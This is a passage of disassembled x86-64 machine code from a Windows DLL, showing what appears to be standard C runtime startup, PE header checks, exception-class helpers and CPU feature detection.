   180002d9c:	48 83 ec 20          	sub    $0x20,%rsp
   180002da0:	49 8b f9             	mov    %r9,%rdi
   180002da3:	49 8b f0             	mov    %r8,%rsi
   180002da6:	8b da                	mov    %edx,%ebx
   180002da8:	48 8b e9             	mov    %rcx,%rbp
   180002dab:	e8 50 07 00 00       	call   0x180003500
   180002db0:	85 c0                	test   %eax,%eax
   180002db2:	75 16                	jne    0x180002dca
   180002db4:	83 fb 01             	cmp    $0x1,%ebx
   180002db7:	75 11                	jne    0x180002dca
   180002db9:	4c 8b c6             	mov    %rsi,%r8
   180002dbc:	33 d2                	xor    %edx,%edx
   180002dbe:	48 8b cd             	mov    %rbp,%rcx
   180002dc1:	48 8b c7             	mov    %rdi,%rax
   180002dc4:	ff 15 e6 13 00 00    	call   *0x13e6(%rip)        # 0x1800041b0
   180002dca:	48 8b 54 24 58       	mov    0x58(%rsp),%rdx
   180002dcf:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   180002dd3:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180002dd8:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   180002ddd:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   180002de2:	48 83 c4 20          	add    $0x20,%rsp
   180002de6:	5f                   	pop    %rdi
   180002de7:	e9 9f 07 00 00       	jmp    0x18000358b
   180002dec:	48 83 ec 28          	sub    $0x28,%rsp
   180002df0:	e8 0b 07 00 00       	call   0x180003500
   180002df5:	85 c0                	test   %eax,%eax
   180002df7:	74 10                	je     0x180002e09
   180002df9:	48 8d 0d c8 39 00 00 	lea    0x39c8(%rip),%rcx        # 0x1800067c8
   180002e00:	48 83 c4 28          	add    $0x28,%rsp
   180002e04:	e9 9a 07 00 00       	jmp    0x1800035a3
   180002e09:	e8 a6 07 00 00       	call   0x1800035b4
   180002e0e:	85 c0                	test   %eax,%eax
   180002e10:	75 05                	jne    0x180002e17
   180002e12:	e8 92 07 00 00       	call   0x1800035a9
   180002e17:	48 83 c4 28          	add    $0x28,%rsp
   180002e1b:	c3                   	ret
   180002e1c:	48 83 ec 28          	sub    $0x28,%rsp
   180002e20:	33 c9                	xor    %ecx,%ecx
   180002e22:	e8 89 07 00 00       	call   0x1800035b0
   180002e27:	48 83 c4 28          	add    $0x28,%rsp
   180002e2b:	e9 80 07 00 00       	jmp    0x1800035b0
   180002e30:	48 83 ec 28          	sub    $0x28,%rsp
   180002e34:	85 c9                	test   %ecx,%ecx
   180002e36:	75 07                	jne    0x180002e3f
   180002e38:	c6 05 81 39 00 00 01 	movb   $0x1,0x3981(%rip)        # 0x1800067c0
   180002e3f:	e8 08 05 00 00       	call   0x18000334c
   180002e44:	e8 67 07 00 00       	call   0x1800035b0
   180002e49:	84 c0                	test   %al,%al
   180002e4b:	75 04                	jne    0x180002e51
   180002e4d:	32 c0                	xor    %al,%al
   180002e4f:	eb 14                	jmp    0x180002e65
   180002e51:	e8 5a 07 00 00       	call   0x1800035b0
   180002e56:	84 c0                	test   %al,%al
   180002e58:	75 09                	jne    0x180002e63
   180002e5a:	33 c9                	xor    %ecx,%ecx
   180002e5c:	e8 4f 07 00 00       	call   0x1800035b0
   180002e61:	eb ea                	jmp    0x180002e4d
   180002e63:	b0 01                	mov    $0x1,%al
   180002e65:	48 83 c4 28          	add    $0x28,%rsp
   180002e69:	c3                   	ret
   180002e6a:	cc                   	int3
   180002e6b:	cc                   	int3
   180002e6c:	40 53                	rex push %rbx
   180002e6e:	48 83 ec 20          	sub    $0x20,%rsp
   180002e72:	80 3d 48 39 00 00 00 	cmpb   $0x0,0x3948(%rip)        # 0x1800067c1
   180002e79:	8b d9                	mov    %ecx,%ebx
   180002e7b:	75 67                	jne    0x180002ee4
   180002e7d:	83 f9 01             	cmp    $0x1,%ecx
   180002e80:	77 6a                	ja     0x180002eec
   180002e82:	e8 79 06 00 00       	call   0x180003500
   180002e87:	85 c0                	test   %eax,%eax
   180002e89:	74 28                	je     0x180002eb3
   180002e8b:	85 db                	test   %ebx,%ebx
   180002e8d:	75 24                	jne    0x180002eb3
   180002e8f:	48 8d 0d 32 39 00 00 	lea    0x3932(%rip),%rcx        # 0x1800067c8
   180002e96:	e8 02 07 00 00       	call   0x18000359d
   180002e9b:	85 c0                	test   %eax,%eax
   180002e9d:	75 10                	jne    0x180002eaf
   180002e9f:	48 8d 0d 3a 39 00 00 	lea    0x393a(%rip),%rcx        # 0x1800067e0
   180002ea6:	e8 f2 06 00 00       	call   0x18000359d
   180002eab:	85 c0                	test   %eax,%eax
   180002ead:	74 2e                	je     0x180002edd
   180002eaf:	32 c0                	xor    %al,%al
   180002eb1:	eb 33                	jmp    0x180002ee6
   180002eb3:	66 0f 6f 05 85 13 00 	movdqa 0x1385(%rip),%xmm0        # 0x180004240
   180002eba:	00 
   180002ebb:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   180002ebf:	f3 0f 7f 05 01 39 00 	movdqu %xmm0,0x3901(%rip)        # 0x1800067c8
   180002ec6:	00 
   180002ec7:	48 89 05 0a 39 00 00 	mov    %rax,0x390a(%rip)        # 0x1800067d8
   180002ece:	f3 0f 7f 05 0a 39 00 	movdqu %xmm0,0x390a(%rip)        # 0x1800067e0
   180002ed5:	00 
   180002ed6:	48 89 05 13 39 00 00 	mov    %rax,0x3913(%rip)        # 0x1800067f0
   180002edd:	c6 05 dd 38 00 00 01 	movb   $0x1,0x38dd(%rip)        # 0x1800067c1
   180002ee4:	b0 01                	mov    $0x1,%al
   180002ee6:	48 83 c4 20          	add    $0x20,%rsp
   180002eea:	5b                   	pop    %rbx
   180002eeb:	c3                   	ret
   180002eec:	b9 05 00 00 00       	mov    $0x5,%ecx
   180002ef1:	e8 fa 00 00 00       	call   0x180002ff0
   180002ef6:	cc                   	int3
   180002ef7:	cc                   	int3
   180002ef8:	48 83 ec 18          	sub    $0x18,%rsp
   180002efc:	4c 8b c1             	mov    %rcx,%r8
   180002eff:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   180002f04:	66 39 05 f5 d0 ff ff 	cmp    %ax,-0x2f0b(%rip)        # 0x180000000
   180002f0b:	75 78                	jne    0x180002f85
   180002f0d:	48 63 0d 28 d1 ff ff 	movslq -0x2ed8(%rip),%rcx        # 0x18000003c
   180002f14:	48 8d 15 e5 d0 ff ff 	lea    -0x2f1b(%rip),%rdx        # 0x180000000
   180002f1b:	48 03 ca             	add    %rdx,%rcx
   180002f1e:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   180002f24:	75 5f                	jne    0x180002f85
   180002f26:	b8 0b 02 00 00       	mov    $0x20b,%eax
   180002f2b:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   180002f2f:	75 54                	jne    0x180002f85
   180002f31:	4c 2b c2             	sub    %rdx,%r8
   180002f34:	0f b7 51 14          	movzwl 0x14(%rcx),%edx
   180002f38:	48 83 c2 18          	add    $0x18,%rdx
   180002f3c:	48 03 d1             	add    %rcx,%rdx
   180002f3f:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   180002f43:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   180002f47:	4c 8d 0c ca          	lea    (%rdx,%rcx,8),%r9
   180002f4b:	48 89 14 24          	mov    %rdx,(%rsp)
   180002f4f:	49 3b d1             	cmp    %r9,%rdx
   180002f52:	74 18                	je     0x180002f6c
   180002f54:	8b 4a 0c             	mov    0xc(%rdx),%ecx
   180002f57:	4c 3b c1             	cmp    %rcx,%r8
   180002f5a:	72 0a                	jb     0x180002f66
   180002f5c:	8b 42 08             	mov    0x8(%rdx),%eax
   180002f5f:	03 c1                	add    %ecx,%eax
   180002f61:	4c 3b c0             	cmp    %rax,%r8
   180002f64:	72 08                	jb     0x180002f6e
   180002f66:	48 83 c2 28          	add    $0x28,%rdx
   180002f6a:	eb df                	jmp    0x180002f4b
   180002f6c:	33 d2                	xor    %edx,%edx
   180002f6e:	48 85 d2             	test   %rdx,%rdx
   180002f71:	75 04                	jne    0x180002f77
   180002f73:	32 c0                	xor    %al,%al
   180002f75:	eb 14                	jmp    0x180002f8b
   180002f77:	83 7a 24 00          	cmpl   $0x0,0x24(%rdx)
   180002f7b:	7d 04                	jge    0x180002f81
   180002f7d:	32 c0                	xor    %al,%al
   180002f7f:	eb 0a                	jmp    0x180002f8b
   180002f81:	b0 01                	mov    $0x1,%al
   180002f83:	eb 06                	jmp    0x180002f8b
   180002f85:	32 c0                	xor    %al,%al
   180002f87:	eb 02                	jmp    0x180002f8b
   180002f89:	32 c0                	xor    %al,%al
   180002f8b:	48 83 c4 18          	add    $0x18,%rsp
   180002f8f:	c3                   	ret
   180002f90:	40 53                	rex push %rbx
   180002f92:	48 83 ec 20          	sub    $0x20,%rsp
   180002f96:	8a d9                	mov    %cl,%bl
   180002f98:	e8 63 05 00 00       	call   0x180003500
   180002f9d:	33 d2                	xor    %edx,%edx
   180002f9f:	85 c0                	test   %eax,%eax
   180002fa1:	74 0b                	je     0x180002fae
   180002fa3:	84 db                	test   %bl,%bl
   180002fa5:	75 07                	jne    0x180002fae
   180002fa7:	48 87 15 0a 38 00 00 	xchg   %rdx,0x380a(%rip)        # 0x1800067b8
   180002fae:	48 83 c4 20          	add    $0x20,%rsp
   180002fb2:	5b                   	pop    %rbx
   180002fb3:	c3                   	ret
   180002fb4:	40 53                	rex push %rbx
   180002fb6:	48 83 ec 20          	sub    $0x20,%rsp
   180002fba:	80 3d ff 37 00 00 00 	cmpb   $0x0,0x37ff(%rip)        # 0x1800067c0
   180002fc1:	8a d9                	mov    %cl,%bl
   180002fc3:	74 04                	je     0x180002fc9
   180002fc5:	84 d2                	test   %dl,%dl
   180002fc7:	75 0c                	jne    0x180002fd5
   180002fc9:	e8 e2 05 00 00       	call   0x1800035b0
   180002fce:	8a cb                	mov    %bl,%cl
   180002fd0:	e8 db 05 00 00       	call   0x1800035b0
   180002fd5:	b0 01                	mov    $0x1,%al
   180002fd7:	48 83 c4 20          	add    $0x20,%rsp
   180002fdb:	5b                   	pop    %rbx
   180002fdc:	c3                   	ret
   180002fdd:	cc                   	int3
   180002fde:	cc                   	int3
   180002fdf:	cc                   	int3
   180002fe0:	48 8d 05 a9 57 00 00 	lea    0x57a9(%rip),%rax        # 0x180008790
   180002fe7:	c3                   	ret
   180002fe8:	83 25 09 38 00 00 00 	andl   $0x0,0x3809(%rip)        # 0x1800067f8
   180002fef:	c3                   	ret
   180002ff0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180002ff5:	55                   	push   %rbp
   180002ff6:	48 8d ac 24 40 fb ff 	lea    -0x4c0(%rsp),%rbp
   180002ffd:	ff 
   180002ffe:	48 81 ec c0 05 00 00 	sub    $0x5c0,%rsp
   180003005:	8b d9                	mov    %ecx,%ebx
   180003007:	b9 17 00 00 00       	mov    $0x17,%ecx
   18000300c:	ff 15 46 10 00 00    	call   *0x1046(%rip)        # 0x180004058
   180003012:	85 c0                	test   %eax,%eax
   180003014:	74 04                	je     0x18000301a
   180003016:	8b cb                	mov    %ebx,%ecx
   180003018:	cd 29                	int    $0x29
   18000301a:	b9 03 00 00 00       	mov    $0x3,%ecx
   18000301f:	e8 c4 ff ff ff       	call   0x180002fe8
   180003024:	33 d2                	xor    %edx,%edx
   180003026:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   18000302a:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   180003030:	e8 20 05 00 00       	call   0x180003555
   180003035:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   180003039:	ff 15 59 10 00 00    	call   *0x1059(%rip)        # 0x180004098
   18000303f:	48 8b 9d e8 00 00 00 	mov    0xe8(%rbp),%rbx
   180003046:	48 8d 95 d8 04 00 00 	lea    0x4d8(%rbp),%rdx
   18000304d:	48 8b cb             	mov    %rbx,%rcx
   180003050:	45 33 c0             	xor    %r8d,%r8d
   180003053:	ff 15 d7 0f 00 00    	call   *0xfd7(%rip)        # 0x180004030
   180003059:	48 85 c0             	test   %rax,%rax
   18000305c:	74 3c                	je     0x18000309a
   18000305e:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   180003064:	48 8d 8d e0 04 00 00 	lea    0x4e0(%rbp),%rcx
   18000306b:	48 8b 95 d8 04 00 00 	mov    0x4d8(%rbp),%rdx
   180003072:	4c 8b c8             	mov    %rax,%r9
   180003075:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   18000307a:	4c 8b c3             	mov    %rbx,%r8
   18000307d:	48 8d 8d e8 04 00 00 	lea    0x4e8(%rbp),%rcx
   180003084:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   180003089:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   18000308d:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   180003092:	33 c9                	xor    %ecx,%ecx
   180003094:	ff 15 9e 0f 00 00    	call   *0xf9e(%rip)        # 0x180004038
   18000309a:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   1800030a1:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1800030a6:	48 89 85 e8 00 00 00 	mov    %rax,0xe8(%rbp)
   1800030ad:	33 d2                	xor    %edx,%edx
   1800030af:	48 8d 85 c8 04 00 00 	lea    0x4c8(%rbp),%rax
   1800030b6:	41 b8 98 00 00 00    	mov    $0x98,%r8d
   1800030bc:	48 83 c0 08          	add    $0x8,%rax
   1800030c0:	48 89 85 88 00 00 00 	mov    %rax,0x88(%rbp)
   1800030c7:	e8 89 04 00 00       	call   0x180003555
   1800030cc:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   1800030d3:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   1800030d8:	c7 44 24 50 15 00 00 	movl   $0x40000015,0x50(%rsp)
   1800030df:	40 
   1800030e0:	c7 44 24 54 01 00 00 	movl   $0x1,0x54(%rsp)
   1800030e7:	00 
   1800030e8:	ff 15 92 0f 00 00    	call   *0xf92(%rip)        # 0x180004080
   1800030ee:	8b d8                	mov    %eax,%ebx
   1800030f0:	33 c9                	xor    %ecx,%ecx
   1800030f2:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   1800030f7:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1800030fc:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   180003100:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   180003105:	ff 15 3d 0f 00 00    	call   *0xf3d(%rip)        # 0x180004048
   18000310b:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   180003110:	ff 15 2a 0f 00 00    	call   *0xf2a(%rip)        # 0x180004040
   180003116:	85 c0                	test   %eax,%eax
   180003118:	75 0d                	jne    0x180003127
   18000311a:	83 fb 01             	cmp    $0x1,%ebx
   18000311d:	74 08                	je     0x180003127
   18000311f:	8d 48 03             	lea    0x3(%rax),%ecx
   180003122:	e8 c1 fe ff ff       	call   0x180002fe8
   180003127:	48 8b 9c 24 d0 05 00 	mov    0x5d0(%rsp),%rbx
   18000312e:	00 
   18000312f:	48 81 c4 c0 05 00 00 	add    $0x5c0,%rsp
   180003136:	5d                   	pop    %rbp
   180003137:	c3                   	ret
   180003138:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000313d:	57                   	push   %rdi
   18000313e:	48 83 ec 20          	sub    $0x20,%rsp
   180003142:	48 8d 1d b7 18 00 00 	lea    0x18b7(%rip),%rbx        # 0x180004a00
   180003149:	48 8d 3d b0 18 00 00 	lea    0x18b0(%rip),%rdi        # 0x180004a00
   180003150:	eb 12                	jmp    0x180003164
   180003152:	48 8b 03             	mov    (%rbx),%rax
   180003155:	48 85 c0             	test   %rax,%rax
   180003158:	74 06                	je     0x180003160
   18000315a:	ff 15 50 10 00 00    	call   *0x1050(%rip)        # 0x1800041b0
   180003160:	48 83 c3 08          	add    $0x8,%rbx
   180003164:	48 3b df             	cmp    %rdi,%rbx
   180003167:	72 e9                	jb     0x180003152
   180003169:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000316e:	48 83 c4 20          	add    $0x20,%rsp
   180003172:	5f                   	pop    %rdi
   180003173:	c3                   	ret
   180003174:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180003179:	57                   	push   %rdi
   18000317a:	48 83 ec 20          	sub    $0x20,%rsp
   18000317e:	48 8d 1d 8b 18 00 00 	lea    0x188b(%rip),%rbx        # 0x180004a10
   180003185:	48 8d 3d 84 18 00 00 	lea    0x1884(%rip),%rdi        # 0x180004a10
   18000318c:	eb 12                	jmp    0x1800031a0
   18000318e:	48 8b 03             	mov    (%rbx),%rax
   180003191:	48 85 c0             	test   %rax,%rax
   180003194:	74 06                	je     0x18000319c
   180003196:	ff 15 14 10 00 00    	call   *0x1014(%rip)        # 0x1800041b0
   18000319c:	48 83 c3 08          	add    $0x8,%rbx
   1800031a0:	48 3b df             	cmp    %rdi,%rbx
   1800031a3:	72 e9                	jb     0x18000318e
   1800031a5:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800031aa:	48 83 c4 20          	add    $0x20,%rsp
   1800031ae:	5f                   	pop    %rdi
   1800031af:	c3                   	ret
   1800031b0:	c2 00 00             	ret    $0x0
   1800031b3:	cc                   	int3
   1800031b4:	40 53                	rex push %rbx
   1800031b6:	48 83 ec 20          	sub    $0x20,%rsp
   1800031ba:	48 8b d9             	mov    %rcx,%rbx
   1800031bd:	48 8b c2             	mov    %rdx,%rax
   1800031c0:	48 8d 0d 91 10 00 00 	lea    0x1091(%rip),%rcx        # 0x180004258
   1800031c7:	0f 57 c0             	xorps  %xmm0,%xmm0
   1800031ca:	48 89 0b             	mov    %rcx,(%rbx)
   1800031cd:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   1800031d1:	48 8d 48 08          	lea    0x8(%rax),%rcx
   1800031d5:	0f 11 02             	movups %xmm0,(%rdx)
   1800031d8:	e8 7e 03 00 00       	call   0x18000355b
   1800031dd:	48 8d 05 a4 10 00 00 	lea    0x10a4(%rip),%rax        # 0x180004288
   1800031e4:	48 89 03             	mov    %rax,(%rbx)
   1800031e7:	48 8b c3             	mov    %rbx,%rax
   1800031ea:	48 83 c4 20          	add    $0x20,%rsp
   1800031ee:	5b                   	pop    %rbx
   1800031ef:	c3                   	ret
   1800031f0:	48 83 61 10 00       	andq   $0x0,0x10(%rcx)
   1800031f5:	48 8d 05 9c 10 00 00 	lea    0x109c(%rip),%rax        # 0x180004298
   1800031fc:	48 89 41 08          	mov    %rax,0x8(%rcx)
   180003200:	48 8d 05 81 10 00 00 	lea    0x1081(%rip),%rax        # 0x180004288
   180003207:	48 89 01             	mov    %rax,(%rcx)
   18000320a:	48 8b c1             	mov    %rcx,%rax
   18000320d:	c3                   	ret
   18000320e:	cc                   	int3
   18000320f:	cc                   	int3
   180003210:	40 53                	rex push %rbx
   180003212:	48 83 ec 20          	sub    $0x20,%rsp
   180003216:	48 8b d9             	mov    %rcx,%rbx
   180003219:	48 8b c2             	mov    %rdx,%rax
   18000321c:	48 8d 0d 35 10 00 00 	lea    0x1035(%rip),%rcx        # 0x180004258
   180003223:	0f 57 c0             	xorps  %xmm0,%xmm0
   180003226:	48 89 0b             	mov    %rcx,(%rbx)
   180003229:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   18000322d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   180003231:	0f 11 02             	movups %xmm0,(%rdx)
   180003234:	e8 22 03 00 00       	call   0x18000355b
   180003239:	48 8d 05 70 10 00 00 	lea    0x1070(%rip),%rax        # 0x1800042b0
   180003240:	48 89 03             	mov    %rax,(%rbx)
   180003243:	48 8b c3             	mov    %rbx,%rax
   180003246:	48 83 c4 20          	add    $0x20,%rsp
   18000324a:	5b                   	pop    %rbx
   18000324b:	c3                   	ret
   18000324c:	48 83 61 10 00       	andq   $0x0,0x10(%rcx)
   180003251:	48 8d 05 68 10 00 00 	lea    0x1068(%rip),%rax        # 0x1800042c0
   180003258:	48 89 41 08          	mov    %rax,0x8(%rcx)
   18000325c:	48 8d 05 4d 10 00 00 	lea    0x104d(%rip),%rax        # 0x1800042b0
   180003263:	48 89 01             	mov    %rax,(%rcx)
   180003266:	48 8b c1             	mov    %rcx,%rax
   180003269:	c3                   	ret
   18000326a:	cc                   	int3
   18000326b:	cc                   	int3
   18000326c:	40 53                	rex push %rbx
   18000326e:	48 83 ec 20          	sub    $0x20,%rsp
   180003272:	48 8b d9             	mov    %rcx,%rbx
   180003275:	48 8b c2             	mov    %rdx,%rax
   180003278:	48 8d 0d d9 0f 00 00 	lea    0xfd9(%rip),%rcx        # 0x180004258
   18000327f:	0f 57 c0             	xorps  %xmm0,%xmm0
   180003282:	48 89 0b             	mov    %rcx,(%rbx)
   180003285:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   180003289:	48 8d 48 08          	lea    0x8(%rax),%rcx
   18000328d:	0f 11 02             	movups %xmm0,(%rdx)
   180003290:	e8 c6 02 00 00       	call   0x18000355b
   180003295:	48 8b c3             	mov    %rbx,%rax
   180003298:	48 83 c4 20          	add    $0x20,%rsp
   18000329c:	5b                   	pop    %rbx
   18000329d:	c3                   	ret
   18000329e:	cc                   	int3
   18000329f:	cc                   	int3
   1800032a0:	48 8d 05 b1 0f 00 00 	lea    0xfb1(%rip),%rax        # 0x180004258
   1800032a7:	48 89 01             	mov    %rax,(%rcx)
   1800032aa:	48 83 c1 08          	add    $0x8,%rcx
   1800032ae:	e9 ae 02 00 00       	jmp    0x180003561
   1800032b3:	cc                   	int3
   1800032b4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800032b9:	57                   	push   %rdi
   1800032ba:	48 83 ec 20          	sub    $0x20,%rsp
   1800032be:	48 8d 05 93 0f 00 00 	lea    0xf93(%rip),%rax        # 0x180004258
   1800032c5:	48 8b f9             	mov    %rcx,%rdi
   1800032c8:	48 89 01             	mov    %rax,(%rcx)
   1800032cb:	8b da                	mov    %edx,%ebx
   1800032cd:	48 83 c1 08          	add    $0x8,%rcx
   1800032d1:	e8 8b 02 00 00       	call   0x180003561
   1800032d6:	f6 c3 01             	test   $0x1,%bl
   1800032d9:	74 0d                	je     0x1800032e8
   1800032db:	ba 18 00 00 00       	mov    $0x18,%edx
   1800032e0:	48 8b cf             	mov    %rdi,%rcx
   1800032e3:	e8 28 02 00 00       	call   0x180003510
   1800032e8:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800032ed:	48 8b c7             	mov    %rdi,%rax
   1800032f0:	48 83 c4 20          	add    $0x20,%rsp
   1800032f4:	5f                   	pop    %rdi
   1800032f5:	c3                   	ret
   1800032f6:	cc                   	int3
   1800032f7:	cc                   	int3
   1800032f8:	48 83 ec 48          	sub    $0x48,%rsp
   1800032fc:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180003301:	e8 ea fe ff ff       	call   0x1800031f0
   180003306:	48 8d 15 e3 19 00 00 	lea    0x19e3(%rip),%rdx        # 0x180004cf0
   18000330d:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180003312:	e8 50 02 00 00       	call   0x180003567
   180003317:	cc                   	int3
   180003318:	48 83 ec 48          	sub    $0x48,%rsp
   18000331c:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180003321:	e8 26 ff ff ff       	call   0x18000324c
   180003326:	48 8d 15 4b 1a 00 00 	lea    0x1a4b(%rip),%rdx        # 0x180004d78
   18000332d:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180003332:	e8 30 02 00 00       	call   0x180003567
   180003337:	cc                   	int3
   180003338:	48 83 79 08 00       	cmpq   $0x0,0x8(%rcx)
   18000333d:	48 8d 05 24 0f 00 00 	lea    0xf24(%rip),%rax        # 0x180004268
   180003344:	48 0f 45 41 08       	cmovne 0x8(%rcx),%rax
   180003349:	c3                   	ret
   18000334a:	cc                   	int3
   18000334b:	cc                   	int3
   18000334c:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180003351:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180003356:	57                   	push   %rdi
   180003357:	48 83 ec 10          	sub    $0x10,%rsp
   18000335b:	33 c0                	xor    %eax,%eax
   18000335d:	33 c9                	xor    %ecx,%ecx
   18000335f:	0f a2                	cpuid
   180003361:	44 8b c1             	mov    %ecx,%r8d
   180003364:	45 33 db             	xor    %r11d,%r11d
   180003367:	44 8b d2             	mov    %edx,%r10d
   18000336a:	41 81 f0 6e 74 65 6c 	xor    $0x6c65746e,%r8d
   180003371:	41 81 f2 69 6e 65 49 	xor    $0x49656e69,%r10d
   180003378:	44 8b cb             	mov    %ebx,%r9d
   18000337b:	8b f0                	mov    %eax,%esi
   18000337d:	33 c9                	xor    %ecx,%ecx
   18000337f:	41 8d 43 01          	lea    0x1(%r11),%eax
   180003383:	45 0b d0             	or     %r8d,%r10d
   180003386:	0f a2                	cpuid
   180003388:	41 81 f1 47 65 6e 75 	xor    $0x756e6547,%r9d
   18000338f:	89 04 24             	mov    %eax,(%rsp)
   180003392:	45 0b d1             	or     %r9d,%r10d
   180003395:	89 5c 24 04          	mov    %ebx,0x4(%rsp)
   180003399:	8b f9                	mov    %ecx,%edi
   18000339b:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   18000339f:	89 54 24 0c          	mov    %edx,0xc(%rsp)
   1800033a3:	75 5b                	jne    0x180003400
   1800033a5:	48 83 0d b3 2c 00 00 	orq    $0xffffffffffffffff,0x2cb3(%rip)        # 0x180006060
   1800033ac:	ff 
   1800033ad:	25 f0 3f ff 0f       	and    $0xfff3ff0,%eax
   1800033b2:	48 c7 05 9b 2c 00 00 	movq   $0x8000,0x2c9b(%rip)        # 0x180006058
   1800033b9:	00 80 00 00 
   1800033bd:	3d c0 06 01 00       	cmp    $0x106c0,%eax
   1800033c2:	74 28                	je     0x1800033ec
   1800033c4:	3d 60 06 02 00       	cmp    $0x20660,%eax
   1800033c9:	74 21                	je     0x1800033ec
   1800033cb:	3d 70 06 02 00       	cmp    $0x20670,%eax
   1800033d0:	74 1a                	je     0x1800033ec
   1800033d2:	05 b0 f9 fc ff       	add    $0xfffcf9b0,%eax
   1800033d7:	83 f8 20             	cmp    $0x20,%eax
   1800033da:	77 24                	ja     0x180003400
   1800033dc:	48 b9 01 00 01 00 01 	movabs $0x100010001,%rcx
   1800033e3:	00 00 00 
   1800033e6:	48 0f a3 c1          	bt     %rax,%rcx
   1800033ea:	73 14                	jae    0x180003400
   1800033ec:	44 8b 05 09 34 00 00 	mov    0x3409(%rip),%r8d        # 0x1800067fc
   1800033f3:	41 83 c8 01          	or     $0x1,%r8d
   1800033f7:	44 89 05 fe 33 00 00 	mov    %r8d,0x33fe(%rip)        # 0x1800067fc
   1800033fe:	eb 07                	jmp    0x180003407
   180003400:	44 8b 05 f5 33 00 00 	mov    0x33f5(%rip),%r8d        # 0x1800067fc
   180003407:	b8 07 00 00 00       	mov    $0x7,%eax
   18000340c:	44 8d 48 fb          	lea    -0x5(%rax),%r9d
   180003410:	3b f0                	cmp    %eax,%esi
   180003412:	7c 26                	jl     0x18000343a
   180003414:	33 c9                	xor    %ecx,%ecx
   180003416:	0f a2                	cpuid
   180003418:	89 04 24             	mov    %eax,(%rsp)
   18000341b:	44 8b db             	mov    %ebx,%r11d
   18000341e:	89 5c 24 04          	mov    %ebx,0x4(%rsp)
   180003422:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   180003426:	89 54 24 0c          	mov    %edx,0xc(%rsp)
   18000342a:	0f ba e3 09          	bt     $0x9,%ebx
   18000342e:	73 0a                	jae    0x18000343a
   180003430:	45 0b c1             	or     %r9d,%r8d
   180003433:	44 89 05 c2 33 00 00 	mov    %r8d,0x33c2(%rip)        # 0x1800067fc
   18000343a:	c7 05 0c 2c 00 00 01 	movl   $0x1,0x2c0c(%rip)        # 0x180006050
   180003441:	00 00 00 
   180003444:	44 89 0d 09 2c 00 00 	mov    %r9d,0x2c09(%rip)        # 0x180006054
   18000344b:	0f ba e7 14          	bt     $0x14,%edi
   18000344f:	0f 83 91 00 00 00    	jae    0x1800034e6
   180003455:	44 89 0d f4 2b 00 00 	mov    %r9d,0x2bf4(%rip)        # 0x180006050
   18000345c:	bb 06 00 00 00       	mov    $0x6,%ebx
   180003461:	89 1d ed 2b 00 00    	mov    %ebx,0x2bed(%rip)        # 0x180006054
   180003467:	0f ba e7 1b          	bt     $0x1b,%edi
   18000346b:	73 79                	jae    0x1800034e6
   18000346d:	0f ba e7 1c          	bt     $0x1c,%edi
   180003471:	73 73                	jae    0x1800034e6
   180003473:	33 c9                	xor    %ecx,%ecx
   180003475:	0f 01 d0             	xgetbv
   180003478:	48 c1 e2 20          	shl    $0x20,%rdx
   18000347c:	48 0b d0             	or     %rax,%rdx
   18000347f:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   180003484:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   180003489:	22 c3                	and    %bl,%al
   18000348b:	3a c3                	cmp    %bl,%al
   18000348d:	75 57                	jne    0x1800034e6
   18000348f:	8b 05 bf 2b 00 00    	mov    0x2bbf(%rip),%eax        # 0x180006054
   180003495:	83 c8 08             	or     $0x8,%eax
   180003498:	c7 05 ae 2b 00 00 03 	movl   $0x3,0x2bae(%rip)        # 0x180006050
   18000349f:	00 00 00 
   1800034a2:	89 05 ac 2b 00 00    	mov    %eax,0x2bac(%rip)        # 0x180006054
   1800034a8:	41 f6 c3 20          	test   $0x20,%r11b
   1800034ac:	74 38                	je     0x1800034e6
   1800034ae:	83 c8 20             	or     $0x20,%eax
   1800034b1:	c7 05 95 2b 00 00 05 	movl   $0x5,0x2b95(%rip)        # 0x180006050
   1800034b8:	00 00 00 
